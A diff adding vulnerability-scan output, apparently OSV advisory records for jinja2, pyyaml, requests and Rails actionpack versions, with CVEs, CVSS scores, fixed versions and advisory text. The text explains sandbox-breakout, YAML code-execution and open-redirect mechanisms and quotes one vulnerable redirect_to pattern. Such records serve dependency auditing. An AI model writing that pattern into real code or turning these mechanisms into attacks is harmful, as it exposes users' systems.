+    "fixed_versions": [
+     "3.1.6"
+    ],
+    "id": "GHSA-cpwx-vrp4-4pq7",
+    "matching_method": "exact_package_version_query",
+    "modified": "2026-09-10T03:49:48.526758681Z",
+    "provider": "OSV",
+    "published": "2025-03-05T20:40:14Z",
+    "severity": "Medium",
+    "source": "GitHub",
+    "summary": "Jinja2 vulnerable to sandbox breakout through attr filter selecting format method",
+    "url": "https://osv.dev/vulnerability/GHSA-cpwx-vrp4-4pq7"
+   },
+   {
+    "advisory_id": "GHSA-g3rq-g295-4j3m",
+    "advisory_origin": "GitHub",
+    "aliases": [
+     "CVE-2020-28493",
+     "PYSEC-2021-66",
+     "SNYK-PYTHON-JINJA2-1012994"
+    ],
+    "cve": "CVE-2020-28493",
+    "cvss": 5.3,
+    "cvss_alternate_assessments": [
+     {
+      "score": 5.3,
+      "source": "advisory severity[].score",
+      "vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:L",
+      "version": "3.1"
+     }
+    ],
+    "cvss_preferred_score": 6.9,
+    "cvss_vector": "CVSS:4.0/AV:N/AC:L/AT:N/PR:N/UI:N/VC:N/VI:N/VA:L/SC:N/SI:N/SA:N",
+    "cvss_version": "4.0",
+    "details": "This affects the package jinja2 from 0.0.0 and before 2.11.3. The ReDOS vulnerability of the regex is mainly due to the sub-pattern [a-zA-Z0-9._-]+.[a-zA-Z0-9._-]+ This issue can be mitigated by Markdown to format user content instead of the urlize filter, or by implementing request timeouts and limiting process memory.",
+    "fixed_versions": [
+     "2.11.3"
+    ],
+    "id": "GHSA-g3rq-g295-4j3m",
+    "matching_method": "exact_package_version_query",
+    "modified": "2025-02-14T05:26:14.565160Z",
+    "provider": "OSV",
+    "published": "2021-03-19T21:28:05Z",
+    "severity": "Medium",
+    "source": "GitHub",
+    "summary": "Regular Expression Denial of Service (ReDoS) in Jinja2",
+    "url": "https://osv.dev/vulnerability/GHSA-g3rq-g295-4j3m"
+   },
+   {
+    "advisory_id": "GHSA-h5c8-rqwp-cp95",
+    "advisory_origin": "GitHub",
+    "aliases": [
+     "CVE-2024-22195",
+     "PYSEC-2026-1473"
+    ],
+    "cve": "CVE-2024-22195",
+    "cvss": 5.4,
+    "cvss_alternate_assessments": [],
+    "cvss_preferred_score": 5.4,
+    "cvss_vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:U/C:L/I:L/A:N",
+    "cvss_version": "3.1",
+    "details": "The `xmlattr` filter in affected versions of Jinja accepts keys containing spaces. XML/HTML attributes cannot contain spaces, as each would then be interpreted as a separate attribute. If an application accepts keys (as opposed to only values) as user input, and renders these in pages that other users see as well, an attacker could use this to inject other attributes and perform XSS. Note that accepting keys as user input is not common or a particularly intended use case of the `xmlattr` filter, and an application doing so should already be verifying what keys are provided regardless of this fix.",
+    "fixed_versions": [
+     "3.1.3"
+    ],
+    "id": "GHSA-h5c8-rqwp-cp95",
+    "matching_method": "exact_package_version_query",
+    "modified": "2026-09-10T03:50:00.236017440Z",
+    "provider": "OSV",
+    "published": "2024-01-11T15:20:48Z",
+    "severity": "Medium",
+    "source": "GitHub",
+    "summary": "Jinja vulnerable to HTML attribute injection when passing user input as keys to xmlattr filter",
+    "url": "https://osv.dev/vulnerability/GHSA-h5c8-rqwp-cp95"
+   },
+   {
+    "advisory_id": "GHSA-h75v-3vvj-5mfj",
+    "advisory_origin": "GitHub",
+    "aliases": [
+     "CVE-2024-34064",
+     "PYSEC-2026-1474"
+    ],
+    "cve": "CVE-2024-34064",
+    "cvss": 5.4,
+    "cvss_alternate_assessments": [],
+    "cvss_preferred_score": 5.4,
+    "cvss_vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:U/C:L/I:L/A:N",
+    "cvss_version": "3.1",
+    "details": "The `xmlattr` filter in affected versions of Jinja accepts keys containing non-attribute characters. XML/HTML attributes cannot contain spaces, `/`, `>`, or `=`, as each would then be interpreted as starting a separate attribute. If an application accepts keys (as opposed to only values) as user input, and renders these in pages that other users see as well, an attacker could use this to inject other attributes and perform XSS. The fix for the previous GHSA-h5c8-rqwp-cp95 CVE-2024-22195 only addressed spaces but not other characters.\n\nAccepting keys as user input is now explicitly considered an unintended use case of the `xmlattr` filter, and code that does so without otherwise validating the input should be flagged as insecure, regardless of Jinja version. Accepting _values_ as user input continues to be safe.",
+    "fixed_versions": [
+     "3.1.4"
+    ],
+    "id": "GHSA-h75v-3vvj-5mfj",
+    "matching_method": "exact_package_version_query",
+    "modified": "2026-09-10T03:50:13.786450101Z",
+    "provider": "OSV",
+    "published": "2024-05-06T14:20:59Z",
+    "severity": "Medium",
+    "source": "GitHub",
+    "summary": "Jinja vulnerable to HTML attribute injection when passing user input as keys to xmlattr filter",
+    "url": "https://osv.dev/vulnerability/GHSA-h75v-3vvj-5mfj"
+   },
+   {
+    "advisory_id": "GHSA-q2x7-8rv6-6q7h",
+    "advisory_origin": "GitHub",
+    "aliases": [
+     "CVE-2024-56326",
+     "PYSEC-2026-1475"
+    ],
+    "cve": "CVE-2024-56326",
+    "cvss": 7.8,
+    "cvss_alternate_assessments": [
+     {
+      "score": 7.8,
+      "source": "advisory severity[].score",
+      "vector": "CVSS:3.1/AV:L/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H",
+      "version": "3.1"
+     }
+    ],
+    "cvss_preferred_score": 5.4,
+    "cvss_vector": "CVSS:4.0/AV:L/AC:L/AT:P/PR:L/UI:P/VC:H/VI:H/VA:H/SC:N/SI:N/SA:N",
+    "cvss_version": "4.0",
+    "details": "An oversight in how the Jinja sandboxed environment detects calls to `str.format` allows an attacker that controls the content of a template to execute arbitrary Python code.\n\nTo exploit the vulnerability, an attacker needs to control the content of a template. Whether that is the case depends on the type of application using Jinja. This vulnerability impacts users of applications which execute untrusted templates.\n\nJinja's sandbox does catch calls to `str.format` and ensures they don't escape the sandbox. However, it's possible to store a reference to a malicious string's `format` method, then pass that to a filter that calls it. No such filters are built-in to Jinja, but could be present through custom filters in an application. After the fix, such indirect calls are also handled by the sandbox.",
+    "fixed_versions": [
+     "3.1.5"
+    ],
+    "id": "GHSA-q2x7-8rv6-6q7h",
+    "matching_method": "exact_package_version_query",
+    "modified": "2026-09-10T03:50:21.662855250Z",
+    "provider": "OSV",
+    "published": "2024-12-23T17:56:08Z",
+    "severity": "Medium",
+    "source": "GitHub",
+    "summary": "Jinja has a sandbox breakout through indirect reference to format method",
+    "url": "https://osv.dev/vulnerability/GHSA-q2x7-8rv6-6q7h"
+   },
+   {
+    "advisory_id": "PYSEC-2026-1473",
+    "advisory_origin": "PyPA",
+    "aliases": [
+     "CVE-2024-22195",
+     "GHSA-H5C8-RQWP-CP95"
+    ],
+    "cve": "CVE-2024-22195",
+    "cvss": 5.4,
+    "cvss_alternate_assessments": [],
+    "cvss_preferred_score": 5.4,
+    "cvss_vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:U/C:L/I:L/A:N",
+    "cvss_version": "3.1",
+    "details": "The `xmlattr` filter in affected versions of Jinja accepts keys containing spaces. XML/HTML attributes cannot contain spaces, as each would then be interpreted as a separate attribute. If an application accepts keys (as opposed to only values) as user input, and renders these in pages that other users see as well, an attacker could use this to inject other attributes and perform XSS. Note that accepting keys as user input is not common or a particularly intended use case of the `xmlattr` filter, and an application doing so should already be verifying what keys are provided regardless of this fix.",
+    "fixed_versions": [
+     "3.1.3"
+    ],
+    "id": "PYSEC-2026-1473",
+    "matching_method": "exact_package_version_query",
+    "modified": "2026-07-07T17:46:13.853151947Z",
+    "provider": "OSV",
+    "published": "2026-07-07T11:45:29.949639Z",
+    "severity": "Medium",
+    "source": "PyPA",
+    "summary": "Jinja vulnerable to HTML attribute injection when passing user input as keys to xmlattr filter",
+    "url": "https://osv.dev/vulnerability/PYSEC-2026-1473"
+   },
+   {
+    "advisory_id": "PYSEC-2026-1474",
+    "advisory_origin": "PyPA",
+    "aliases": [
+     "CVE-2024-34064",
+     "GHSA-H75V-3VVJ-5MFJ"
+    ],
+    "cve": "CVE-2024-34064",
+    "cvss": 5.4,
+    "cvss_alternate_assessments": [],
+    "cvss_preferred_score": 5.4,
+    "cvss_vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:U/C:L/I:L/A:N",
+    "cvss_version": "3.1",
+    "details": "The `xmlattr` filter in affected versions of Jinja accepts keys containing non-attribute characters. XML/HTML attributes cannot contain spaces, `/`, `>`, or `=`, as each would then be interpreted as starting a separate attribute. If an application accepts keys (as opposed to only values) as user input, and renders these in pages that other users see as well, an attacker could use this to inject other attributes and perform XSS. The fix for the previous GHSA-h5c8-rqwp-cp95 CVE-2024-22195 only addressed spaces but not other characters.\n\nAccepting keys as user input is now explicitly considered an unintended use case of the `xmlattr` filter, and code that does so without otherwise validating the input should be flagged as insecure, regardless of Jinja version. Accepting _values_ as user input continues to be safe.",
+    "fixed_versions": [
+     "3.1.4"
+    ],
+    "id": "PYSEC-2026-1474",
+    "matching_method": "exact_package_version_query",
+    "modified": "2026-07-07T17:46:13.832160246Z",
+    "provider": "OSV",
+    "published": "2026-07-07T11:45:41.875280Z",
+    "severity": "Medium",
+    "source": "PyPA",
+    "summary": "Jinja vulnerable to HTML attribute injection when passing user input as keys to xmlattr filter",
+    "url": "https://osv.dev/vulnerability/PYSEC-2026-1474"
+   },
+   {
+    "advisory_id": "PYSEC-2026-1475",
+    "advisory_origin": "PyPA",
+    "aliases": [
+     "CVE-2024-56326",
+     "GHSA-Q2X7-8RV6-6Q7H"
+    ],
+    "cve": "CVE-2024-56326",
+    "cvss": 7.8,
+    "cvss_alternate_assessments": [
+     {
+      "score": 7.8,
+      "source": "advisory severity[].score",
+      "vector": "CVSS:3.1/AV:L/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H",
+      "version": "3.1"
+     }
+    ],
+    "cvss_preferred_score": 5.4,
+    "cvss_vector": "CVSS:4.0/AV:L/AC:L/AT:P/PR:L/UI:P/VC:H/VI:H/VA:H/SC:N/SI:N/SA:N",
+    "cvss_version": "4.0",
+    "details": "An oversight in how the Jinja sandboxed environment detects calls to `str.format` allows an attacker that controls the content of a template to execute arbitrary Python code.\n\nTo exploit the vulnerability, an attacker needs to control the content of a template. Whether that is the case depends on the type of application using Jinja. This vulnerability impacts users of applications which execute untrusted templates.\n\nJinja's sandbox does catch calls to `str.format` and ensures they don't escape the sandbox. However, it's possible to store a reference to a malicious string's `format` method, then pass that to a filter that calls it. No such filters are built-in to Jinja, but could be present through custom filters in an application. After the fix, such indirect calls are also handled by the sandbox.",
+    "fixed_versions": [
+     "3.1.5"
+    ],
+    "id": "PYSEC-2026-1475",
+    "matching_method": "exact_package_version_query",
+    "modified": "2026-07-07T17:46:13.842466429Z",
+    "provider": "OSV",
+    "published": "2026-07-07T14:34:47.732576Z",
+    "severity": "High",
+    "source": "PyPA",
+    "summary": "Jinja has a sandbox breakout through indirect reference to format method",
+    "url": "https://osv.dev/vulnerability/PYSEC-2026-1475"
+   }
+  ],
+  "PyPI|pyyaml|3.13": [
+   {
+    "advisory_id": "GHSA-8q59-q68h-6hv4",
+    "advisory_origin": "GitHub",
+    "aliases": [
+     "CVE-2020-14343",
+     "PYSEC-2021-142"
+    ],
+    "cve": "CVE-2020-14343",
+    "cvss": 9.8,
+    "cvss_alternate_assessments": [
+     {
+      "score": 9.8,
+      "source": "advisory severity[].score",
+      "vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H",
+      "version": "3.1"
+     }
+    ],
+    "cvss_preferred_score": 9.3,
+    "cvss_vector": "CVSS:4.0/AV:N/AC:L/AT:N/PR:N/UI:N/VC:H/VI:H/VA:H/SC:N/SI:N/SA:N",
+    "cvss_version": "4.0",
+    "details": "A vulnerability was discovered in the PyYAML library in versions before 5.4, where it is susceptible to arbitrary code execution when it processes untrusted YAML files through the full_load method or with the FullLoader loader. Applications that use the library to process untrusted input may be vulnerable to this flaw. This flaw allows an attacker to execute arbitrary code on the system by abusing the python/object/new constructor. This flaw is due to an incomplete fix for CVE-2020-1747.",
+    "fixed_versions": [
+     "5.4"
+    ],
+    "id": "GHSA-8q59-q68h-6hv4",
+    "matching_method": "exact_package_version_query",
+    "modified": "2026-02-04T03:33:10.792778Z",
+    "provider": "OSV",
+    "published": "2021-03-25T21:26:26Z",
+    "severity": "Critical",
+    "source": "GitHub",
+    "summary": "Improper Input Validation in PyYAML",
+    "url": "https://osv.dev/vulnerability/GHSA-8q59-q68h-6hv4"
+   },
+   {
+    "advisory_id": "GHSA-rprw-h62v-c2w7",
+    "advisory_origin": "GitHub",
+    "aliases": [
+     "CVE-2017-18342",
+     "PYSEC-2018-49"
+    ],
+    "cve": "CVE-2017-18342",
+    "cvss": 9.8,
+    "cvss_alternate_assessments": [],
+    "cvss_preferred_score": 9.8,
+    "cvss_vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H",
+    "cvss_version": "3.1",
+    "details": "In PyYAML before 5.1, the `yaml.load()` API could execute arbitrary code. In other words, `yaml.safe_load` is not used.\n\nThis was intended to be fixed in 4.1, but due to [breaking changes](https://github.com/yaml/pyyaml/issues/192#issuecomment-401491470), 4.1 was yanked and 5.1 [contains](https://github.com/yaml/pyyaml/issues/207#issuecomment-472520007) the patch for CVE-2017-18342.",
+    "fixed_versions": [
+     "5.1"
+    ],
+    "id": "GHSA-rprw-h62v-c2w7",
+    "matching_method": "exact_package_version_query",
+    "modified": "2026-07-01T17:45:34.796248930Z",
+    "provider": "OSV",
+    "published": "2019-01-04T17:45:26Z",
+    "severity": "Critical",
+    "source": "GitHub",
+    "summary": "PyYAML insecurely deserializes YAML strings leading to arbitrary code execution",
+    "url": "https://osv.dev/vulnerability/GHSA-rprw-h62v-c2w7"
+   }
+  ],
+  "PyPI|pyyaml|5.3.1": [
+   {
+    "advisory_id": "GHSA-8q59-q68h-6hv4",
+    "advisory_origin": "GitHub",
+    "aliases": [
+     "CVE-2020-14343",
+     "PYSEC-2021-142"
+    ],
+    "cve": "CVE-2020-14343",
+    "cvss": 9.8,
+    "cvss_alternate_assessments": [
+     {
+      "score": 9.8,
+      "source": "advisory severity[].score",
+      "vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H",
+      "version": "3.1"
+     }
+    ],
+    "cvss_preferred_score": 9.3,
+    "cvss_vector": "CVSS:4.0/AV:N/AC:L/AT:N/PR:N/UI:N/VC:H/VI:H/VA:H/SC:N/SI:N/SA:N",
+    "cvss_version": "4.0",
+    "details": "A vulnerability was discovered in the PyYAML library in versions before 5.4, where it is susceptible to arbitrary code execution when it processes untrusted YAML files through the full_load method or with the FullLoader loader. Applications that use the library to process untrusted input may be vulnerable to this flaw. This flaw allows an attacker to execute arbitrary code on the system by abusing the python/object/new constructor. This flaw is due to an incomplete fix for CVE-2020-1747.",
+    "fixed_versions": [
+     "5.4"
+    ],
+    "id": "GHSA-8q59-q68h-6hv4",
+    "matching_method": "exact_package_version_query",
+    "modified": "2026-02-04T03:33:10.792778Z",
+    "provider": "OSV",
+    "published": "2021-03-25T21:26:26Z",
+    "severity": "Critical",
+    "source": "GitHub",
+    "summary": "Improper Input Validation in PyYAML",
+    "url": "https://osv.dev/vulnerability/GHSA-8q59-q68h-6hv4"
+   }
+  ],
+  "PyPI|requests|2.31.0": [
+   {
+    "advisory_id": "GHSA-9hjg-9r4m-mvj7",
+    "advisory_origin": "GitHub",
+    "aliases": [
+     "CVE-2024-47081",
+     "PYSEC-2026-1872"
+    ],
+    "cve": "CVE-2024-47081",
+    "cvss": 5.3,
+    "cvss_alternate_assessments": [],
+    "cvss_preferred_score": 5.3,
+    "cvss_vector": "CVSS:3.1/AV:N/AC:H/PR:N/UI:R/S:U/C:H/I:N/A:N",
+    "cvss_version": "3.1",
+    "details": "### Impact\n\nDue to a URL parsing issue, Requests releases prior to 2.32.4 may leak .netrc credentials to third parties for specific maliciously-crafted URLs.\n\n### Workarounds\nFor older versions of Requests, use of the .netrc file can be disabled with `trust_env=False` on your Requests Session ([docs](https://requests.readthedocs.io/en/latest/api/#requests.Session.trust_env)).\n\n### References\nhttps://github.com/psf/requests/pull/6965\nhttps://seclists.org/fulldisclosure/2025/Jun/2",
+    "fixed_versions": [
+     "2.32.4"
+    ],
+    "id": "GHSA-9hjg-9r4m-mvj7",
+    "matching_method": "exact_package_version_query",
+    "modified": "2026-10-19T20:00:04.716114530Z",
+    "provider": "OSV",
+    "published": "2025-06-09T19:06:08Z",
+    "severity": "Medium",
+    "source": "GitHub",
+    "summary": "Requests vulnerable to .netrc credentials leak via malicious URLs",
+    "url": "https://osv.dev/vulnerability/GHSA-9hjg-9r4m-mvj7"
+   },
+   {
+    "advisory_id": "GHSA-9wx4-h78v-vm56",
+    "advisory_origin": "GitHub",
+    "aliases": [
+     "CVE-2024-35195",
+     "PYSEC-2026-1873"
+    ],
+    "cve": "CVE-2024-35195",
+    "cvss": 5.6,
+    "cvss_alternate_assessments": [],
+    "cvss_preferred_score": 5.6,
+    "cvss_vector": "CVSS:3.1/AV:L/AC:H/PR:H/UI:R/S:U/C:H/I:H/A:N",
+    "cvss_version": "3.1",
+    "details": "When using a `requests.Session`, if the first request to a given origin is made with `verify=False`, TLS certificate verification may remain disabled for all subsequent requests to that origin, even if `verify=True` is explicitly specified later.\n\nThis occurs because the underlying connection is reused from the session's connection pool, causing the initial TLS verification setting to persist for the lifetime of the pooled connection. As a result, applications may unintentionally send requests without certificate verification, leading to potential man-in-the-middle attacks and compromised confidentiality or integrity.\n\nThis behavior affects versions of `requests` prior to 2.32.0.",
+    "fixed_versions": [
+     "2.32.0"
+    ],
+    "id": "GHSA-9wx4-h78v-vm56",
+    "matching_method": "exact_package_version_query",
+    "modified": "2026-09-10T03:50:13.740879755Z",
+    "provider": "OSV",
+    "published": "2024-05-20T20:15:00Z",
+    "severity": "Medium",
+    "source": "GitHub",
+    "summary": "Requests `Session` object does not verify requests after making first request with verify=False",
+    "url": "https://osv.dev/vulnerability/GHSA-9wx4-h78v-vm56"
+   },
+   {
+    "advisory_id": "GHSA-gc5v-m9x4-r6x2",
+    "advisory_origin": "GitHub",
+    "aliases": [
+     "CVE-2026-25645",
+     "PYSEC-2026-2275"
+    ],
+    "cve": "CVE-2026-25645",
+    "cvss": 4.4,
+    "cvss_alternate_assessments": [],
+    "cvss_preferred_score": 4.4,
+    "cvss_vector": "CVSS:3.1/AV:L/AC:H/PR:L/UI:R/S:U/C:N/I:H/A:N",
+    "cvss_version": "3.1",
+    "details": "### Impact\nThe `requests.utils.extract_zipped_paths()` utility function uses a predictable filename when extracting files from zip archives into the system temporary directory. If the target file already exists, it is reused without validation. A local attacker with write access to the temp directory could pre-create a malicious file that would be loaded in place of the legitimate one.\n\n### Affected usages\n**Standard usage of the Requests library is not affected by this vulnerability.** Only applications that call `extract_zipped_paths()` directly are impacted.\n\n### Remediation\nUpgrade to at least Requests 2.33.0, where the library now extracts files to a non-deterministic location.\n\nIf developers are unable to upgrade, they can set `TMPDIR` in their environment to a directory with restricted write access.",
+    "fixed_versions": [
+     "2.33.0"
+    ],
+    "id": "GHSA-gc5v-m9x4-r6x2",
+    "matching_method": "exact_package_version_query",
+    "modified": "2026-09-10T03:50:39.207922076Z",
+    "provider": "OSV",
+    "published": "2026-03-25T16:56:28Z",
+    "severity": "Medium",
+    "source": "GitHub",
+    "summary": "Requests has Insecure Temp File Reuse in its extract_zipped_paths() utility function",
+    "url": "https://osv.dev/vulnerability/GHSA-gc5v-m9x4-r6x2"
+   },
+   {
+    "advisory_id": "PYSEC-2026-1872",
+    "advisory_origin": "PyPA",
+    "aliases": [
+     "CVE-2024-47081",
+     "GHSA-9HJG-9R4M-MVJ7"
+    ],
+    "cve": "CVE-2024-47081",
+    "cvss": 5.3,
+    "cvss_alternate_assessments": [],
+    "cvss_preferred_score": 5.3,
+    "cvss_vector": "CVSS:3.1/AV:N/AC:H/PR:N/UI:R/S:U/C:H/I:N/A:N",
+    "cvss_version": "3.1",
+    "details": "### Impact\n\nDue to a URL parsing issue, Requests releases prior to 2.32.4 may leak .netrc credentials to third parties for specific maliciously-crafted URLs.\n\n### Workarounds\nFor older versions of Requests, use of the .netrc file can be disabled with `trust_env=False` on your Requests Session ([docs](https://requests.readthedocs.io/en/latest/api/#requests.Session.trust_env)).\n\n### References\nhttps://github.com/psf/requests/pull/6965\nhttps://seclists.org/fulldisclosure/2025/Jun/2",
+    "fixed_versions": [
+     "2.32.4"
+    ],
+    "id": "PYSEC-2026-1872",
+    "matching_method": "exact_package_version_query",
+    "modified": "2026-07-07T17:47:00.332079836Z",
+    "provider": "OSV",
+    "published": "2026-07-07T16:02:54.151964Z",
+    "severity": "Medium",
+    "source": "PyPA",
+    "summary": "Requests vulnerable to .netrc credentials leak via malicious URLs",
+    "url": "https://osv.dev/vulnerability/PYSEC-2026-1872"
+   },
+   {
+    "advisory_id": "PYSEC-2026-1873",
+    "advisory_origin": "PyPA",
+    "aliases": [
+     "CVE-2024-35195",
+     "GHSA-9WX4-H78V-VM56"
+    ],
+    "cve": "CVE-2024-35195",
+    "cvss": 5.6,
+    "cvss_alternate_assessments": [],
+    "cvss_preferred_score": 5.6,
+    "cvss_vector": "CVSS:3.1/AV:L/AC:H/PR:H/UI:R/S:U/C:H/I:H/A:N",
+    "cvss_version": "3.1",
+    "details": "When using a `requests.Session`, if the first request to a given origin is made with `verify=False`, TLS certificate verification may remain disabled for all subsequent requests to that origin, even if `verify=True` is explicitly specified later.\n\nThis occurs because the underlying connection is reused from the session's connection pool, causing the initial TLS verification setting to persist for the lifetime of the pooled connection. As a result, applications may unintentionally send requests without certificate verification, leading to potential man-in-the-middle attacks and compromised confidentiality or integrity.\n\nThis behavior affects versions of `requests` prior to 2.32.0.",
+    "fixed_versions": [
+     "2.32.0"
+    ],
+    "id": "PYSEC-2026-1873",
+    "matching_method": "exact_package_version_query",
+    "modified": "2026-07-07T17:46:36.762141019Z",
+    "provider": "OSV",
+    "published": "2026-07-07T11:45:42.890131Z",
+    "severity": "Medium",
+    "source": "PyPA",
+    "summary": "Requests `Session` object does not verify requests after making first request with verify=False",
+    "url": "https://osv.dev/vulnerability/PYSEC-2026-1873"
+   },
+   {
+    "advisory_id": "PYSEC-2026-2275",
+    "advisory_origin": "PyPA",
+    "aliases": [
+     "CVE-2026-25645",
+     "GHSA-GC5V-M9X4-R6X2"
+    ],
+    "cve": "CVE-2026-25645",
+    "cvss": 5.5,
+    "cvss_alternate_assessments": [],
+    "cvss_preferred_score": 5.5,
+    "cvss_vector": "CVSS:3.1/AV:L/AC:L/PR:L/UI:N/S:U/C:N/I:H/A:N",
+    "cvss_version": "3.1",
+    "details": "Requests is a HTTP library. Prior to version 2.33.0, the `requests.utils.extract_zipped_paths()` utility function uses a predictable filename when extracting files from zip archives into the system temporary directory. If the target file already exists, it is reused without validation. A local attacker with write access to the temp directory could pre-create a malicious file that would be loaded in place of the legitimate one. Standard usage of the Requests library is not affected by this vulnerability. Only applications that call `extract_zipped_paths()` directly are impacted. Starting in version 2.33.0, the library extracts files to a non-deterministic location. If developers are unable to upgrade, they can set `TMPDIR` in their environment to a directory with restricted write access.",
+    "fixed_versions": [
+     "2.33.0"
+    ],
+    "id": "PYSEC-2026-2275",
+    "matching_method": "exact_package_version_query",
+    "modified": "2026-07-13T07:15:43.964902190Z",
+    "provider": "OSV",
+    "published": "2026-03-25T17:16:52.970Z",
+    "severity": "Medium",
+    "source": "PyPA",
+    "summary": "",
+    "url": "https://osv.dev/vulnerability/PYSEC-2026-2275"
+   }
+  ],
+  "RubyGems|actionpack|7.0.3.1": [
+   {
+    "advisory_id": "GHSA-4g8v-vg43-wpgf",
+    "advisory_origin": "GitHub",
+    "aliases": [
+     "CVE-2023-28362"
+    ],
+    "cve": "CVE-2023-28362",
+    "cvss": 4.0,
+    "cvss_alternate_assessments": [],
+    "cvss_preferred_score": 4.0,
+    "cvss_vector": "CVSS:3.1/AV:L/AC:L/PR:N/UI:N/S:U/C:N/I:L/A:N",
+    "cvss_version": "3.1",
+    "details": "The `redirect_to` method in Rails allows provided values to contain characters which are not legal in an HTTP header value. This results in the potential for downstream services which enforce RFC compliance on HTTP response headers to remove the assigned Location header. This vulnerability has been assigned the CVE identifier CVE-2023-28362.\n\nVersions Affected: All. Not affected: None Fixed Versions: 7.0.5.1, 6.1.7.4\n\n# Impact\n\nThis introduces the potential for a Cross-site-scripting (XSS) payload to be delivered on the now static redirection page. Note that this both requires user interaction and for a Rails app to be configured to allow redirects to external hosts (defaults to false in Rails >= 7.0.x).\n\n# Releases\n\nThe FIXED releases are available at the normal locations.\n\n# Workarounds\n\nAvoid providing user supplied URLs with arbitrary schemes to the `redirect_to` method.",
+    "fixed_versions": [
+     "6.1.7.4",
+     "7.0.5.1"
+    ],
+    "id": "GHSA-4g8v-vg43-wpgf",
+    "matching_method": "exact_package_version_query",
+    "modified": "2025-05-05T17:49:20.823550Z",
+    "provider": "OSV",
+    "published": "2023-06-29T15:03:16Z",
+    "severity": "Medium",
+    "source": "GitHub",
+    "summary": "Actionpack has possible cross-site scripting vulnerability via User Supplied Values to redirect_to",
+    "url": "https://osv.dev/vulnerability/GHSA-4g8v-vg43-wpgf"
+   },
+   {
+    "advisory_id": "GHSA-8xww-x3g3-6jcv",
+    "advisory_origin": "GitHub",
+    "aliases": [
+     "CVE-2023-22795"
+    ],
+    "cve": "CVE-2023-22795",
+    "cvss": null,
+    "cvss_alternate_assessments": [],
+    "cvss_preferred_score": null,
+    "cvss_vector": null,
+    "cvss_version": null,
+    "details": "There is a possible regular expression based DoS vulnerability in Action Dispatch related to the If-None-Match header. This vulnerability has been assigned the CVE identifier CVE-2023-22795.\n\nVersions Affected: All Not affected: None Fixed Versions: 5.2.8.15 (Rails LTS), 6.1.7.1, 7.0.4.1\n\nImpact\n\nA specially crafted HTTP If-None-Match header can cause the regular expression engine to enter a state of catastrophic backtracking, when on a version of Ruby below 3.2.0. This can cause the process to use large amounts of CPU and memory, leading to a possible DoS vulnerability All users running an affected release should either upgrade or use one of the workarounds immediately.\nReleases\n\nThe FIXED releases are available at the normal locations.\nWorkarounds\n\nWe recommend that all users upgrade to one of the FIXED versions. In the meantime, users can mitigate this vulnerability by using a load balancer or other device to filter out malicious If-None-Match headers before they reach the application.\n\nUsers on Ruby 3.2.0 or greater are not affected by this vulnerability.\nPatches\n\nTo aid users who aren\u2019t able to upgrade immediately we have provided patches for the two supported release series. They are in git-am format and consist of a single changeset.\n\n    6-1-Avoid-regex-backtracking-on-If-None-Match-header.patch - Patch for 6.1 series\n    7-0-Avoid-regex-backtracking-on-If-None-Match-header.patch - Patch for 7.0 series\n\nPlease note that only the 7.0.Z and 6.1.Z series are supported at present, and 6.0.Z for severe vulnerabilities. Users of earlier unsupported releases are advised to upgrade as soon as possible as we cannot guarantee the continued availability of security fixes for unsupported releases.",
+    "fixed_versions": [
+     "6.1.7.1",
+     "7.0.4.1"
+    ],
+    "id": "GHSA-8xww-x3g3-6jcv",
+    "matching_method": "exact_package_version_query",
+    "modified": "2025-03-31T13:41:44.379427Z",
+    "provider": "OSV",
+    "published": "2023-01-18T18:20:51Z",
+    "severity": "Low",
+    "source": "GitHub",
+    "summary": "ReDoS based DoS vulnerability in Action Dispatch",
+    "url": "https://osv.dev/vulnerability/GHSA-8xww-x3g3-6jcv"
+   },
+   {
+    "advisory_id": "GHSA-9445-4cr6-336r",
+    "advisory_origin": "GitHub",
+    "aliases": [
+     "CVE-2023-22797"
+    ],
+    "cve": "CVE-2023-22797",
+    "cvss": 6.1,
+    "cvss_alternate_assessments": [],
+    "cvss_preferred_score": 6.1,
+    "cvss_vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:L/A:N",
+    "cvss_version": "3.1",
+    "details": "There is a vulnerability in Action Controller\u2019s redirect_to. This vulnerability has been assigned the CVE identifier CVE-2023-22797.\n\nVersions Affected: >= 7.0.0 Not affected: < 7.0.0 Fixed Versions: 7.0.4.1\nImpact \n\nThere is a possible open redirect when using the redirect_to helper with untrusted user input.\n\nVulnerable code will look like this:\n```\nredirect_to(params[:some_param])\n```\n\nRails 7.0 introduced protection against open redirects from calling redirect_to with untrusted user input. In prior versions the developer was fully responsible for only providing trusted input. However the check introduced could be bypassed by a carefully crafted URL.\n\nAll users running an affected release should either upgrade or use one of the workarounds immediately.\nReleases\n\nThe FIXED releases are available at the normal locations.\nWorkarounds\n\nThere are no feasible workarounds for this issue.\nPatches\n\nTo aid users who aren\u2019t able to upgrade immediately we have provided patches for the two supported release series. They are in git-am format and consist of a single changeset.\n\n    7-0-Fix-sec-issue-with-_url_host_allowed.patch - Patch for 7.0 series\n\nPlease note that only the 7.0.Z and 6.1.Z series are supported at present, and 6.0.Z for severe vulnerabilities. Users of earlier unsupported releases are advised to upgrade as soon as possible as we cannot guarantee the continued availability of security fixes for unsupported releases.",
+    "fixed_versions": [
+     "7.0.4.1"
+    ],
+    "id": "GHSA-9445-4cr6-336r",
+    "matching_method": "exact_package_version_query",
+    "modified": "2024-02-16T08:22:57.644557Z",
+    "provider": "OSV",
+    "published": "2023-01-18T18:21:23Z",
+    "severity": "Medium",
+    "source": "GitHub",
+    "summary": "Open Redirect Vulnerability in Action Pack",
+    "url": "https://osv.dev/vulnerability/GHSA-9445-4cr6-336r"
+   },
+   {
+    "advisory_id": "GHSA-9822-6m93-xqf4",
+    "advisory_origin": "GitHub",
+    "aliases": [
+     "BIT-RAILS-2024-26143",
+     "CVE-2024-26143"
+    ],
+    "cve": "CVE-2024-26143",
+    "cvss": 6.1,
+    "cvss_alternate_assessments": [],
+    "cvss_preferred_score": 6.1,
